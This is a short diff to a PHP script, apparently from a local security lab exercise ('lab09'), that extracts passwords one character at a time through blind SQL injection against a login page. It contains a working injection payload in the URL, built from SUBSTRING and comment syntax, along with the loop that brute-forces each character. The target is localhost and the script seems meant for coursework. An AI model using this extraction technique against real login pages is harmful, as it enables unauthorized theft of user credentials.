@@ -89,10 +89,10 @@ for($id = 1; $id <= 100; $id++){
 
 	$letter = "";
 	for ($i = 1; $i <= $sizepwd; $i++) {
-		foreach (range(33,127) as $character){
+		foreach (range(0,127) as $character){
 			$letter = chr($character);
          //echo "$letter \n";
-			print($letter);
+
 			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 			$result = file_get_contents($url);
 			if (strpos($result, 'cat') !== false) {
